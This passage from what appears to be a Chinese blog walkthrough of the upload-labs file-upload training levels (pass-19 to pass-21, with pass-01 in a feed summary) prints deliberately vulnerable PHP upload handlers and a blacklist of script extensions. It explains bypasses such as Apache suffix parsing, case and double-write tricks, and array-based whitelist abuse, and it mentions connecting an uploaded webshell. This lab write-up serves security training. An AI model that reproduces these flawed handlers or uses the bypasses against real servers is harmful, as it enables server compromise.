class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>同上一关,但是在上一关的基础上,对文件名进行修改,需要配合文件包含漏洞或其他漏洞<br>绕过白名单过滤：利用apache的后缀名识别漏洞 —— 从右往左依次识别后缀，遇到不能识别的后缀名便跳过 ，因此可以文件名改为create.php.7z（.7z这个后缀apache不能识别）</li></ul><h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><ul><li>源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>上传<br>黑名单,会对文件名重命名,双写,大小写都可以绕过<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151405930.png?token=ARYCSATJRWMONW5XYBJMCCTCQCMIA"></li></ul><h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>检查MIME和白名单,以<code>.</code>切割为数组,取数组最后一个元素来校验是否在白名单内,再取数组数-1来重命名后缀<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151406269.png?token=ARYCSATYTCCNBOWEHY3CJF3CQCMI4"></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pass-01&quot;&gt;&lt;a href=&quot;#pass-01&quot; class=&quot;headerlink&quot; title=&quot;pass-01&quot;&gt;&lt;/a&gt;pass-01&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;checkFile&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; file = document.&lt;span class=&quot;title function_ invoke__&quot;&gt;getElementsByName&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].value;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (file == &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt; || file == &lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;title function_ invoke__&quot;&gt;alert&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;请选择要上传的文件!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//定义允许上传的文件类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; allow_ext = &lt;span class=&quot;string&quot;&gt;&amp;quot;.jpg|.png|.gif&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//提取上传文件的类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ext_name = file.&lt;span class=&quot;title function_ invoke__&quot;&gt;substring&lt;/span&gt;(file.&lt;span class=&quot;title function_ invoke__&quot;&gt;lastIndexOf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//判断上传文件类型是否允许上传&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (allow_ext.&lt;span class=&quot;title function_ invoke__&quot;&gt;indexOf&lt;/span&gt;(ext_name + &lt;span class=&quot;string&quot;&gt;&amp;quot;|&amp;quot;&lt;/span&gt;) == -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; errMsg = &lt;span class=&quot;string&quot;&gt;&amp;quot;该文件不允许上传，请上传&amp;quot;&lt;/span&gt; + allow_ext + &lt;span class=&quot;string&quot;&gt;&amp;quot;类型的文件,当前文件类型为：&amp;quot;&lt;/span&gt; + ext_name;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;title function_ invoke__&quot;&gt;alert&lt;/span&gt;(errMsg);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;上传&lt;br&gt;  白名单,仅允许上传&lt;code&gt;.jpg|.png|.gif&lt;/code&gt;,但是只有前端校验&lt;br&gt;  上传jpg抓包修改为php&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205151356926.png?token=ARYCSATVNRPU6DWWWKPPKE3CQCLEW&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;连接webshell&lt;br&gt;  复制图片地址,使用蚁剑连接&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205151356854.png?token=ARYCSAREF6OTJWLDGZ2MYFTCQCLFY&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;pass-02&quot;&gt;&lt;a href=&quot;#pass-02&quot; class=&quot;headerlink&quot; title=&quot;pass-02&quot;&gt;&lt;/a&gt;pass-02&lt;/h1&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$is_upload&lt;/span&gt; = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$msg&lt;/span&gt; = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;title function_ 